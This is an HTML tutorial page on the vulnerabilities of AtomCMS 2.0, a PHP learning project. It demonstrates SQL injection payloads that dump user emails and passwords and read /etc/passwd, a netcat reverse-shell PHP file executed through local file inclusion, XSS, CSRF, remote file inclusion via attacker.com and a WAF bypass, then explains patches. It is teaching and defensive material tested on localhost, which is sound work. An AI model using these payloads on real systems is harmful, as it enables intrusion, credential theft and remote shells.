@@ -1,0 +1,604 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>AtomCMS 2.0 - Security</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+  <link href="css/style.css" type="text/css" rel="stylesheet" />
+  <link rel="icon" href="images/icon.png" />
+</head>
+
+<body>
+
+  <nav class="navbar navbar-dark navbar-expand-lg fixed-top bg-dark">
+    <div class="container-fluid">
+      <a class="navbar-brand" href="#">AtomCMS 2.0 - Security</a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+          <li class="nav-item">
+            <a class="nav-link" href="#sql-injection">SQL Injection</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#xss">XSS</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#csrf">CSRF</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#file-upload-attack">File Upload Attack</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#local-file-inclusion">Local File Inclusion</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#full-path-disclosure">Full Path Disclosure</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#collision-attack">Collision Attack</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#important">Patching</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#note">Note</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container">
+    <h1>Explaining web application vulnerabilities in AtomCMS 2.0</h1>
+    <p>AtomCMS is a great resource for learning PHP. <strong><em>Yes, it is still a relevant project after almost 9
+          years since the first video was added to the playlist.</strong></em> - <a
+        href="https://www.youtube.com/watch?v=u4-aItfZQuo&list=PLAkMqlQoeMeiwvNWpe3mhgQxAa1jiGwmt.">Video tutorials
+        here.</a></p>
+    <p>Learning PHP is not the only scope of AtomCMS 2.0. We can also use this project as a penetration testing
+      environment.</p>
+    <p>In this documentation I will demonstrate how a bad actor could potentially take advantage of a few attack vectors
+      which are present in AtomCMS 2.0. I will explain where, why and how these vulnerabilities can be exploited.</p>
+    <p>I also created a new branch called "AtomCMS-2.1". It is the exact same project except for some
+      changes which are <strong><u>necessary</u></strong> for us in order to make AtomCMS production ready.</p>
+      <p>Please keep in mind that at the time of writing this, I used PHP 7.4.</p>
+    <p>If you are not interested in learning web application penetration testing and you only want to know how to
+      <u>properly</u> patch the security holes present in the project, <a href="#important">then skip to the patching section by clicking here</a>.
+    </p>
+
+    <h2>Disclaimer</h2>
+    <p><strong><em>This documentation has been made available only for educational purposes. The information present in
+          this documentation is not meant to be used for illegal or malicious purpose. Hacking websites is illegal. You
+          are responsible for your own actions.</em></strong></p>
+    <hr />
+    <h3 class="title-padding" id="sql-injection">SQL Injection - <a href="#patch-sqli">Patching</a></h3>
+    <p>SQL injection is a type of vulnerability which stems from a failure to properly sanitize user input. It allows
+      attackers to execute rogue database queries by manipulating the vulnerable URL or vulnerable form inputs.</p>
+    <p>Let's see how we can exploit a SQL injection present in the admin login panel in order for us to gain access:</p>
+    <img class="center gif" src="gif/login-hack.gif" />
+    <h3>Why is this possible?</h3>
+    <p class="lead">It's because the sql query is constructed in such a manner that it can take user input. Let's
+      analyze the following code:</p>
+    <p><code>$q = "SELECT * FROM users WHERE email = '$_POST[email]' AND password = sha1('$_POST[password]')";</code>
+    </p>
+    <p>In this case, '$_POST[email]' or sha1('$_POST[password]') could be anything. So, we can escape the user input with
+      a single quote and craft sql instructions. Basically, our sql query will look like this:</p>
+    <p>
+      <code><u>"SELECT * FROM users WHERE email = '' OR 1=1 LIMIT 1 #</u> ' AND password = sha1('$_POST[password]')"</code>
+    </p>
+    <p>We are escaping outside of the quotes around $_POST[email] with a single quote and then we can write sql.
+      Everything after the # sign will be considered a comment.</p>
+    <p>Also, notice that client side filters can be bypassed. I modified the email address input to be of type text
+      instead of email.</p>
+    <p>Why do we need to write LIMIT 1?</p>
+    <p>It's because, otherwise, we will get more than one record from the database and our injection will not work.</p>
+    <p>The password field is not different by much. We must observe (or guess) how the sql query is written. In this
+      case we must escape outside of the sha1() function:</p>
+    <img class="center gif" src="gif/login-hack2.gif">
+    <p>The query will become like this:</p>
+    <code>$q = "SELECT * FROM users WHERE email = '' AND <u>password = sha1('') OR 1=1 LIMIT 1 # ') </u>"</code>
+    <p>The easiest and funniest way to inject code in this case is to just write a user's email followed by a single
+      quote and a hash sign:</p>
+    <img class="center gif" src="gif/login-hack3.gif">
+    <p>SQL Injection can be present in multiple places around AtomCMS 2.0. We can also inject code on the
+      main page using the URL because the sql query is written with data received from the user using $_GET superglobal
+      included directly into the query.</p>
+    <p>You might be familiar with this:
+      <code>MySQL error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...</code>
+    </p>
+    <p>If we get an error like that after we wrote a single quote in the query parameter: <code>?id=1'</code> or if the
+      page is behaving unexpected, for example not showing anything on the body if you write a false statement, then the website might be vulnerable to
+      sql injection; because sometimes we can determine if the page is vulnerable to sql injection even if we don't get
+      a mysql error. Keep in mind that the single quote is not the only way to fuzz a web application. <code
+        class="bg-dark text-white p-1">?id=500000</code> is another example. Also, in some cases, we can write sql code
+      into the page without the need of a single quote, so we don't have to escape anything.</p>
+    <p>There are two important steps for a successfull sql injection: breaking the query and then repairing it.</p>
+    <p>In the case of AtomCMS 2.0, we have a blind sql injection. We can observe that because:</p>
+    <p><code class="bg-dark text-white p-1">http://localhost/Atom.CMS/home' AND 1=1 --+</code> this url will show us the
+      title and the content on the page's body because 1=1 is a true statement while <code
+        class="bg-dark text-white p-1">http://localhost/Atom.CMS/home' AND 1=2 --+</code> will not show us anything
+      except for the navigation and the footer.</p>
+    <ol>
+      <li>First, I fuzzed the application with a single quote in the query parameter.</li>
+      <li>The website responded with nothing on the page except for the navbar and the footer.</li>
+      <li>I repaired the sql construct using "--+". I will explain what --+ means below.</li>
+      <li>I proceeded to write the sql injection.</li>
+    </ol>
+
+    <p>In sql, -- or # are considered comments but because we are interacting with a web front-end, we need to follow
+      the double dash with a + sign because an additional space is required. This is mandatory for MySQL.</p>
+    <p>The + sign is encoded as a space in the URL standard. We can also use %23 and forget about the space or just use
+      a single dash "-" instead of a + sign: <code class="bg-dark text-white p-1">-- -</code></p>
+    <p>From the mysql documentation: <strong>From a -- sequence to the end of the line. In MySQL, the -- (double-dash)
+        comment style requires the second dash to be followed by at least one whitespace or control character (such as a
+        space, tab, newline, and so on). This syntax differs slightly from standard SQL comment syntax, as discussed in
+        Section 1.8.2.4, "'--' as the Start of a Comment".</strong></p>
+    <p>Now let's observe the following link and understand what the sql code in the query parameter means:</p>
+    <p class="bg-dark text-white p-2">http://localhost/Atom.CMS/homee' union select
+      1,2,3,4,5,group_concat(schema_name),7,8 from information_schema.schemata --+</p>
+    <p><code class="bg-dark text-white p-1">union</code> will join two sql queries together but in order for that to
+      work, we need to find out the number of columns used in the code (not in the database). This is mandatory because
+      <code class="bg-dark text-white p-1">union</code> needs the number of columns used in the first part of the query.
+    </p>
+    <p>So we do that with <code class="bg-dark text-white p-1">order by</code></p>
+    <img class="center gif-large" src="gif/order-by.gif">
+    <p>As you can see, "order by 9" gives us nothing on the page but "order by 8" gives us the title and the content on
+      the page's body. So that means we have 8 columns in use.</p>
+    <p>We proceed to write like this: <code class="bg-dark text-white p-1">union select 1,2,3,4,5,6,7,8 --+</code> but
+      because the sql code contains two parts, the first part which is written by the author and our sql injection code,
+      in order for <code class="bg-dark text-white p-1">union</code> to work we need to invalidate the first part of the
+      query by just writing an invalid value for the query parameter: home becomes homee</p>
+    <img class="center image" src="images/injection-1.png" />
+    <p>Usually you would see numbers on the page (These numbers represent the columns) but because AtomCMS has a
+      relationship between the "posts" table and the "posts_type" table, it doesn't know what page to include in the
+      body. However, you can see the number 6 in the browser's tab. That's the title of our webpage. We can replace the
+      number 6 with sql commands like <code class="bg-dark text-white p-1">@@version</code>, <code
+        class="bg-dark text-white p-1">database()</code>, <code class="bg-dark text-white p-1">user()</code> or <code
+        class="bg-dark text-white p-1">@@version_compile_os</code>.</p>
+    <p>This is how it would look inside phpmyadmin:</p>
+    <img class="center image" src="images/columns.png" />
+    <code
+      class="bg-dark text-white p-2">http://localhost/Atom.CMS/homee' union select 1,2,3,4,5,group_concat(schema_name),7,8 from information_schema.schemata --+</code>
+    <p class="mt-3">The injection from above will list all the databases on the server.</p>
+    <img class="center image" src="images/injection-2.png">
+    <h3>What is information_schema ?</h3>
+    <p>information_schema is a database that comes preinstalled with mysql. It contains information about the structure
+      of our databases. We can use information_schema to read all the databases from the server, tables, columns and
+      rows.</p>
+    <p>So you can see how destructive sql injection really is.</p>
+    <h3>What is group_concat() ?</h3>
+    <p><code class="bg-dark text-white p-1">group_concat()</code> is a function which will concat values inside of one
+      column:</p>
+    <img class="center image" src="images/group_concat.png" />
+    <p>So you can see that the 8th column is the "body" column. We used group_concat() to dump all the tables from the
+      current database.</p>
+    <p>This injection will list all the tables from the current database:</p>
+    <p><code
+        class="bg-dark text-white p-2">http://localhost/Atom.CMS/homee' union select 1,2,3,4,5,group_concat(table_name),7,8 from information_schema.tables where table_schema=database() --+</code>
+    </p>
+    <p>This one will list all the columns from the users:</p>
+    <p><code
+        class="bg-dark text-white p-2">http://localhost/Atom.CMS/homee' union select 1,2,3,4,5,group_concat(column_name),7,8 from information_schema.columns where table_name="users" --+</code>
+    </p>
+    <p>This time we put "users" in double quotes after table_name= because it is data.</p>
+    <p>And finally, this one will list all the emails:</p>
+    <p><code
+        class="bg-dark text-white p-2">http://localhost/Atom.CMS/homee' union select 1,2,3,4,5,group_concat(email),7,8 from users --+</code>
+    </p>
+    <p>And passwords:</p>
+    <p><code
+        class="bg-dark text-white p-2">http://localhost/Atom.CMS/homee' union select 1,2,3,4,5,group_concat(password),7,8 from users --+</code>
+    </p>
+    <p>As you can see, we need to find out the tables names, then the columns names and then we can read the data from
+      the rows.</p>
+    <h3>We can also do a sql injection using the file upload functionality</h3>
+    <p class="lead">How ?</p>
+    <p>Because it's a real-time request, we need to intercept the request with a proxy software. I will use burp suite
+      in this demonstration: </p>
+    <img class="center image" src="images/payload.png" />
+    <p>We can't just modify ?id=1 into anything we want because the server will respond with a status code of 400. Burp
+      suite encodes the payload for me.</p>
+    <p>The above payload will result in this:</p>
+    <img class="center image" src="images/file-upload-sqli.png" />
+    <p>The result can be seen in the Network tab, under "response" in the developer tools.</p>
+    <p>The strange syntax you are seeing above is called a <a
+        href="https://security.stackexchange.com/questions/104193/double-query-injection">double query injection.</a>
+      Pay attention to the last line: <code
+        class="bg-dark text-light p-1">Duplicate entry '::atomcms::0' for key 'group_key'</code>. Here we are creating
+      errors for us in order to find out information about the database.</p>
+    <p>Using this kind of injection sometimes will get you a message like: <code
+        class="bg-dark text-white p-1">"Subquery returns more than one row".</code>This is completely fine. Keep trying
+      until you see the error which contains the database name.</p>
+    <p>Unfortunately, we can't dump all the tables in one shot with this kind of exploit. We have to use <code
+        class="bg-dark text-white p-1">LIMIT 0,1 LIMIT 1,1...</code>in order to get all the tables. This would be best
+      done with an automated tool.</p>
+    <p><code class="bg-dark text-white p-1">0,1</code> in the limit clause represents the offset and the row count. 0 is
+      the first table while 1 is the only result.</p>
+    <p>The double query injection syntax for finding out a table is:</p>
+    <p><code class="bg-dark text-light p-1">AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a)b) #
+        </code></p>
+    <p>Notice that you'll have to figure out when to use <code class="bg-dark text-white">AND</code> or <code
+        class="bg-dark text-white">OR</code> ...</p>
+
+    <h3>Gaining a remote shell connection</h3>
+    <p>There are several ways to get a remote shell connection. For example, we can upload a file with sql injection and
+      then navigate to that file using another vulnerability called <a href="#local-file-inclusion">Local File
+        Inclusion.</a> When that happens, the malicious file will be executed and we will gain access to the target web
+      server.</p>
+    <p>You can read and write files with sql injection, however, you need to have permission for this.</p>
+    <p><u>Keep in mind that if SQLi and LFI are present on different websites which are hosted on the same server, then
+        we can use one website for uploading a file on the server using sql injection and another website to exploit the
+        local file inclusion vulnerability in order to gain full access to the target web server.</u></p>
+
+    <h3>Reading files with sql injection</h3>
+    <p>There is a little trick about reading files using sql injection in AtomCMS 2.0. In the front-end part of the
+      website, we have a certain type of functionality for creating clean URLS. The code is written in such a manner
+      that it strips <strong>"/"</strong> using the explode() function in PHP and then we only use the first part of the
+      URL to make a database query. So $path['call_parts'][0] is used for generating user data for a database query. If
+      we have another <strong>"/"</strong> then our injection will be split and we have to bypass that kind of filtering
+      in order to get an injection.</p>
+
+    <p><code
+        class="bg-dark text-white p-1">http://localhost/Atom.CMS/homee' union select 1,2,3,4,5,load_file('/etc/passwd'),7,8 --+</code>
+      doesn't show us the content of /etc/passwd</p>
+    <p>But <code
+        class="bg-dark text-white p-1">http://localhost/Atom.CMS/homee' union select 1,2,3,4,5,load_file(from_base64('L2V0Yy9wYXNzd2Q=')),7,8 --+</code>
+      does.</p>
+    <img class="center image" src="images/content.png">
+    <p>Unfortunately, we can't encode the pathname for writing a file because that's an operation, not a function. But
+      I'm just gonna use the admin panel for writing the shell.</p>
+    <img class="center image-small" src="images/remote-shell.png" />
+    <p><code
+        class="bg-dark text-white p-1">' union select "&lt;?php passthru('nc -e /bin/bash 127.0.0.1 8888'); ?>",null,null,null,null,null,null into outfile '/tmp/shell.php' #</code>
+    </p>
+    <p>Here are are using the passthru() php function for executing a system command. In this case, I am listening for
+      my own connection on port 8888 using netcat. An attacker will write his ip address.</p>
+    <img class="center image" src="images/listening.png" />
+    <p>And now we just need to get that file to execute. I will explain this in the Local File Inclusion section.</p>
+
+    <hr />
+    <h3 class="title-padding" id="local-file-inclusion">Local File Inclusion - <a href="#patch-lfi">Patching</a></h3>
+    <p>Local File Inclusion is another critical web application vulnerability because it allows us to read files from
+      the system, so we can read sensitive information from the target web server. We could also read files from another
+      website which is hosted on the same server.</p>
+    <p><strong><u>In the worst case scenario, we can read files outside of the web server directory regardless of the
+          extension, if we have permission for this. If that's the case, we can gain a remote shell by just trying to
+          connect to the server with ssh but instead of the username, we encode a payload and then browse to <code
+            class="bg-dark text-white p-1">/var/log/auth.log</code>.</u></strong></p>
+    <p>This happens because we are including files with user supplied data without any kind of filtering. Keep in mind
+      that some filters can be bypassed though...</p>
+    <p>So because AtomCMS 2.0 includes files with $_GET['page'] without filtering, we can browse to any php file we want
+      outside of the views folder:</p>
+    <img class="center image" src="images/lfi.png" />
+
+    <p><code class="bg-dark text-white p-1">?page=../../../lfi</code> => Because my server's path is /var/www/html, this means i need to go one step back from the views folder, so now we are in admin, one step back to the front end files and one step back into the "html" folder. lfi is a php file which prints "Local
+      File Inclusion".</p>
+    <p>Now, I am going to browse to the /tmp folder and execute my malicious shell which was uploaded with sql
+      injection:</p>
+    <p>In my case, <code class="bg-dark text-white p-1">?page=../../../../../../tmp/shell</code> will result in:</p>
+    <img class="center image" src="images/connected.png" />
+    <p>I am now connected to my own web server and I can run system commands.</p>
+    <hr />
+
+    <h3 class="title-padding" id="xss">XSS/Cross Site Scripting - <a href="#patch-xss">Patching</a></h3>
+    <p>There are 3 types of XSS: Reflected, DOM based and Stored. I will demonstrate all of them using AtomCMS 2.0.</p>
+    <p>XSS, unlike sql injection, is a client based injection. XSS means we can inject malicious javascript code inside of a web page. It's a very critical vulnerability because an attacker can steal cookies or user sessions from the browser.</p> 
+    <p>Furthermore, someone who gives you a link which contains malicious javascript can hook your browser into a software called "BeeF Exploitation Framework". This tool will allow the attacker to run commands against your browser. For example, he can redirect you to fake login pages or trigger an alert stating that an update is available. If you download and run that "update", you will actually execute the attacker's backdoor.</p>
+      
+    <h4>Reflected XSS</h4>
+    <p>Reflected XSS requires an attacker to craft malicious javascript code inside of the URL so he can send the link to someone else. We have a Reflected XSS into the debug panel, because we are outputting the $_GET data into the page without any kind of sanitisation. So, we can write <code class="bg-dark text-white p-1">&lt;script>alert('XSS')&lt;/script></code> for both the key and the value which forms the $_GET array. Of course an attacker would write more than just a simple alert.</p>
+    <p>The same vulnerability applies for $_POST and for the script which helps us to make clean URLs. I rewrote all of those arrays with sanitisation.</p>
+  
+    <h4>Dom Based XSS</h4>
+    <p>Dom based XSS occurs when we can inject javascript code inside of a web page and the malicious js code sinks inside elements, thus the name "DOM based". Someone can write a DOM based xss inside of the URL, inside of a textbox or into a select element etc.</p>
+    <p>The payload can be different from website to website, so there is not a single way of achieving this.</p>
+    <p>In AtomCMS 2.0, I will show you a stored/dom XSS inside of the admin panel. It's stored because we can insert code into the database and dom based because we have to escape the input element.</p>
+    <p>If we store code like this and then click the chevron icon for editing that page, the code will not execute because it's inside of the value HTML property for an input:</p>
+    <img class="center image" src="images/xss-dom.png" />
+    <p>But if we escape out of that input element, using <code class="bg-dark text-white p-1">" /></code> then our alert will execute.</p>
+    <img class="center image" src="images/xss-dom1.png" />
+    <p>Basically our code will look like this:</p>
+    <img class="center image" src="images/xss-dom2.png" />
+
+    <h4>Stored XSS</h4>
+    <p>Imagine a form where users are allowed to post comments; if someone is injecting code like this: <code class="bg-dark text-white p-1">&lt;img src="" onerror="alert('XSS')" /></code> then, it gets stored into the database and everytime a user loads that web page, the alert popup will execute. This is an example of a stored xss. In my opinion, this is the most severe type of cross site scripting.</p>
+    <p>In AtomCMS 2.0, you simulate this kind of attack by storing a post which has a script in the page's body. If someone else wants to read that post, the script will execute. It doesn't require the attacker to trick the victim into clicking a link.</p>
+    <p>Since AtomCMS 2.0 is supposed to allow HTML into a post's body, I will use HTML Purifier for this. More information in the <a href="#patch-xss">patching xss</a> section.</p>
+     
+    <h4>Dangerous JavaScript Methods</h4>
+    <p>You should not use the following methods for outputting user input data: <code class="bg-dark text-white p-1">innerHTML</code> in Javascript or <code class="bg-dark text-white p-1">html()</code> in jQuery unless you encode the data <a target="_blank" href="https://portswigger.net/web-security/cross-site-scripting/preventing">like here.</a></p>
+
+    <hr />
+
+    <h3 class="title-padding" id="csrf">CSRF - Cross Site Request Forgery - <a href="#patch-csrf">Patching</a></h3>
+    <p>Cross Site Request Forgery will allow the victim to make a request, a specific action which is not initially desired. For example, if someone is logged into the admin panel and the attacker tricks the victim into clicking a certain link which contains a properly crafted HTML form, then the attacker's form will execute a request with certain values for the specific website, where the victim is logged in. In this way, passwords can be changed against one's will:</p>
+    <img class="center image" src="images/csrf.png" />
+    <img class="center gif-large" src="gif/csrf.gif" />
+    <p>The password for the first user is now changed. Also, the email, first name and last name will contain an empty string because i didn't set any values for these fields in the CSRF form.</p>
+    <hr />
+    <h3 class="title-padding" id="full-path-disclosure">Full Path Disclosure - <a href="#patch-fpd">Patching</a></h3>
+    <p>Because we can access paths which are not supposed to return a 200 OK status such as <code class="bg-dark text-white p-1">http://localhost/Atom.CMS/config/connection.php</code>, someone could find out the absolute path and use sql injection to load the content into the page, revealing sensitive information, for example database credentials:</p>
+    <img class="center image" src="images/path-disclosure-sqli.png" />
+    <p>The payload is <code class="bg-dark text-white p-1">http://localhost/Atom.CMS/homee' union select 1,2,3,4,5,load_file(from_base64('L3Zhci93d3cvaHRtbC9BdG9tLkNNUy9jb25maWcvY29ubmVjdGlvbi5waHA=')),7,8 --+</code></p>
+    <p>The base 64 code is actually my path: <code class="bg-dark text-white p-1">/var/www/html/Atom.CMS/config/connection.php</code></p>
+    <p>Note that the page's content will not be executed, even if it's php code, when loaded with the sql function load_file().</p>
+    <hr />
+    <h3 class="title-padding" id="file-upload-attack">File Upload Attack - <a href="#patch-file-upload">Patching</a></h3>
+    <p>We can also gain a remote connection to the target server if we can upload any kind of file. We can use a tool
+      like weevely for generating stealth malicious PHP code and then connecting to it:</p>
+      <img class="center image" src="images/weevely.png" />
+      <img class="center image" src="images/weevely-1.png" />
+    <p><strong>I want to point out another important factor here.</strong></p>
+    <p>Some tutorials will tell you that checking both the size and the extension of the file for an upload
+      functionality is enough for security. <strong><em><u>It is not.</u></em></strong></p>
+    <img class="center image-small" src="images/matrix.jpg" />
+    <p>We can write malicious php code inside of an image (inside EXIF data) and then use <a
+        href="#local-file-inclusion">Local File
+        Inclusion</a> on the same website or on another website which is present on the same server for getting a remote shell
+      connection. We can even use Remote File Inclusion if that's available to us. Remote File Inclusion is the same
+      type of attack as LFI except for the fact that we are loading a file which is located on another server:
+    <p><code
+        class="bg-dark text-white p-1">https://victim.com/?page=<span class="text-danger">https://attacker.com/image.png</span></code>
+    </p>
+    <p>Better safe than sorry. We should encode the original metadata of the file with an image library like GD or
+      Imagick.</p>
+    <img class="center image" src="images/image-metadata.png" />
+    <p>This can get me a remote shell as long as I can execute that image inside the page.</p>
+    <p><u>We need to include the image into the page
+        using a LFI attack so it gets executed by the web server instead of getting it read by the web browser. That way
+        we can get a remote shell connection. Simply loading the image into the browser will do nothing.</u></p>
+    <p><u>I think SVG images can execute javascript inside the browser when they are loaded. However, svg images are out
+        of our scope.</u></p>
+    <p>If a web page contains code like this: <code
+        class="bg-dark text-white p-1">&lt;?php include($_GET['page']); ?&gt;</code> then we can use an absolute path
+      for executing our malicious image as long as we know the name and the path of the image. We need to exploit user
+      controllable data inside the <code class="bg-dark text-white p-1">include()</code> function in PHP.
+      I intercepted the file upload request with burpsuite and then modified the data inside the image to contain a
+      system command.</p>
+    <p><u>The important note here is that we need to <u>correctly</u> check for the type, extension, size
+        (so we
+        are not vulnerable to a Denial of Service Attack because of someone who is uploading very large files), encode
+        the metadata with an image library like PHP-GD, rename the file, move it to our desired folder and delete
+        the temporary file. It is also advised to have your "uploads" folder outside of your web root. You can put your
+        "uploads" folder one level back from the root web directory (in "/var/www/" if the projects are located in
+        /var/www/html/).</u> /var/www/html/ is the server's path for a debian based operating system. In Arch Linux, the server is located in /srv/html.</p>
+        <p>However, there is a gotcha to keep in mind: some images will not have a .png or .jpeg extension in the name, which could trigger an error. Also, <code class="bg-dark text-white p-1">$_FILES['image']['mime']</code> is not a reliable way of checking the mime because an image without an extension in the name can have a mime of application/octet-stream. For correctly checking the mime, we must use the <code class="bg-dark text-white p-1">finfo</code> php function which would return a mime of image/jpeg or image/png instead of application/octet-stream.</p>
+    <p>I wrote a script for this kind of functionality which you can see <a href="#">here</a>.</p>
+    <hr />
+
+    <h3 class="title-padding" id="collision-attack">Collision Attack - <a href="#patch-collision">Patching</a></h3>
+    <p>In cryptography, a collision attack on a cryptographic hash tries to find two inputs producing the same hash
+      value, i.e. a hash collision. <strong>Source: Wikipedia.</strong></p>
+    <p>SHA1 is vulnerable to this type of attack so we will just switch to BCrypt instead. At this point in time, bcrypt
+      is the default hashing algorithm to use in PHP.</p>
+    <hr />
+    <h3 class="title-padding" id="important">Important</h3>
+    <p><strong><u>WAF (Web Application Firewall) will not protect your website against sql injection, xss or other type of vulnerability. Someone can use a syntax like this: <code class="bg-dark text-white p-1">/*!50000UNION*/ /*!50000SELECT*/</code> and bypass the waf protection for a successfull sqli attack.</u></strong></p>
+    <h3 class="title-padding" id="patch-sqli">Patching SQL Injection</h3>
+    <p>In order for us to patch SQL Injections, we must use prepared statements. <u>Using prepared statements is the
+        only proper way to do a sql statement.</u> I will show you how to use PDO (PHP Data Objects) with prepared
+      statements and why this is different and safer than concatenated user data variables directly into the sql query. However, I
+      am not going to write a full tutorial on PDO or Object Oriented Programming.</p>
+    <p><a target="_blank" href="https://phpdelusions.net/pdo/">This is a great resource for learning PDO.</a></p>
+
+    <p>SQL Injection happens because sql code is executed at the same time with user supplied data. Prepared Statements
+      will send the sql instruction on a separate channel from the data thus making sql injection ineffective.</p>
+    <p><u><strong><em>Keep in mind that you should never concatenate user data inside of a prepared statement. You should always use placeholders.</em></strong></u>
+    </p>
+    <p>Let's create a PDO instance:</p>
+    <pre>
+    <code>
+  $host = '127.0.0.1';
+  $db   = 'atomcms';
+  $user = 'dev';
+  $pass = 'thepassword1';
+  $charset = 'utf8mb4';
+
+  $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
+  $options = [
+    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    PDO::ATTR_EMULATE_PREPARES   => false
+        ];
+  
+  $pdo = new PDO($dsn, $user, $pass, $options);
+      
+      </code>
+    </pre>
+
+
+    <p>It's important to respect <u><strong>this exact same structure</strong></u>. We are passing the corresponding
+      variables and options into the PDO instance.</p>
+    <p>However, the <code class="text-primary">PDO::ATTR_EMULATE_PREPARES => false</code> can be optional. If this
+      option is not present, pdo will use emulated prepared statements <strong>which is not a security problem as long
+        as the database encoding is set (we did it above) and you are using a supported mysql version.</strong> <a
+        href="https://phpdelusions.net/pdo#emulation" target="_blank">More info here</a></p>
+    <p>If we want to execute a query, we can use PDO's <code class="text-primary">prepare()</code> and <code
+        class="text-primary">execute()</code> functions. <code class="text-primary">prepare()</code> will set the query
+      with the corresponding placeholders while <code class="text-primary">execute()</code> will replace the
+      placeholders with our data and execute the query:</p>
+    <pre>
+      <code>
+    $stmt = $pdo->prepare("SELECT * FROM posts WHERE slug = :slug");
+    $stmt->execute(['slug' => $path['call_parts'][0]]);
+      </code>
+    </pre>
+
+    <p>As you can see, we are not concatenating variables inside of our sql instruction. Instead, I used a placeholder: <code class="bg-dark text-white p-1">:slug</code>. In this case, we are
+      making 2 roundtrips to the database because we have set the <code
+        class="text-primary">PDO::ATTR_EMULATE_PREPARES => false</code> option inside of our PDO instance object. The
+      sql instruction and our data are sent separately in 2 roundtrips to the database.</p>
+    <p>We pass an array to the <code class="text-primary">execute()</code> function and we use the placeholders as keys.</p>
+    <p>Since AtomCMS 2.0 is using a procedural style of programming, we will use the following syntax inside of our
+      project:</p>
+    <pre>
+          <code>
+    function pdo($pdo, $sql, $args = NULL)
+      {
+        if (!$args)
+          {
+            return $pdo->query($sql);
+          }
+      $stmt = $pdo->prepare($sql);
+      $stmt->execute($args);
+      return $stmt;
+      }
+
+    $data = pdo($dbc, "SELECT * FROM posts WHERE slug = :slug", 
+    ['slug' => $path['call_parts'][0]])->fetch(); 
+          </code>
+        </pre>
+    <hr />
+
+    <h3 class="title-padding" id="patch-xss">Patching XSS</h3>
+    <p>For patching XSS when we want to output content into the document and we don't care about preserving HTML, we can use the following function: </p>
+    <p>
+    <pre>
+      <code class="text-primary">htmlspecialchars($string, ENT_QUOTES, 'UTF-8')</code>
+    </pre>
+  </p>
+  <p>This function encodes tags into special entities so the browser won't interpret any malicious scripts. You should also use this function when you want to output into an HTML attribute.</p>
+    <p>If we want to output into HTML document and let people format their messages using HTML, then we should use <a href="http://htmlpurifier.org/" target="_blank">HTML Purifier</a>. I will include and use its functionality in the admin side of the website, where we are submitting posts. </p>
+    <p>Keep in mind that HTML Purifier is PHP 5 and PHP 7. At the time of writing this, I used PHP 7.</p>
+    <p>I will also use this function inside AtomCMS-2.1:</p>
+  <pre>
+  <code>
+  function escape_html($content)
+  {
+    return htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
+  }
+  </code>
+</pre>
+    <p><u>It is important to note that using libraries in a project can be quite a relative subject when it comes to
+        security. For example, some older versions of libraries such as jQuery or TinyMCE had xss vulnerabilities.</u></p>
+    <p><u>However, this doesn't necessarily mean that the newer versions of these libraries are 100% secure.</u></p>
+    <p>As a
+      matter of fact, TinyMCE suffered an XSS vulnerability at the time of writing this...</p>
+      <p><a href="https://github.com/tinymce/tinymce/security/advisories/GHSA-gg8r-xjwq-4w92" target="_blank">Disclosure</a></p>
+    <p>When you are using a WYSIWYG editor in your project, you should use only the functions that you need and not all
+      of them. It is advised to use <a target="_blank" href="http://htmlpurifier.org/">HTML Purifier</a> along with TinyMCE.</p>
+      <p>Since TinyMCE would be available only if you are logged into the admin area of AtomCMS, I am assuming that you are trusting whoever else may be using AtomCMS along with you.</p>
+    <p>I updated Dropzone.js and jQuery with the latest versions. If you want to use TinyMCE, create an account to get a key and follow their documentation.</p>
+    <hr />
+
+    <h3 class="title-padding" id="patch-csrf">Patching CSRF</h3>
+    <p>For patching CSRF, we must create unique tokens everytime we login. We store these tokens in our session and check against these tokens everytime we want to make a POST request, for example submitting a new page or changing the passwords. So we will include our session token inside of a hidden input element into the form and validate the session variable against the token from the form at the time of the POST HTTP method.</p>
+    <p>This method called Synchronizer Token Pattern.</p>
+    <p>Even if an attacker crafts the form with his generated token, it will not be the same token as the victim's one thus making this attack ineffective.</p>
+    <p>A side note: using the GET HTTP method for changing the state of a resource is not a good practice. AtomCMS 2.0 does this in several places. <a href="https://softwareengineering.stackexchange.com/a/188861" target="_blank">Read more here.</a> I modified those requests to be of type POST.</p>
+
+    <p>You should also check the referer if you are planning on using AtomCMS in production.</p>
+    <p><a target="_blank" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP CSRF Prevention Cheatsheet</a></p>
+    <hr />
+      
+    <h3 class="title-padding" id="patch-lfi">Patching Local File Inclusion</h3>
+    <p>In order to patch local file inclusions, we must check the user input against a white list or we can just hardcode the links without user input data.</p>
+    <p>In the case of AtomCMS, I will use a whitelist:</p>
+    <pre>
+          <code>
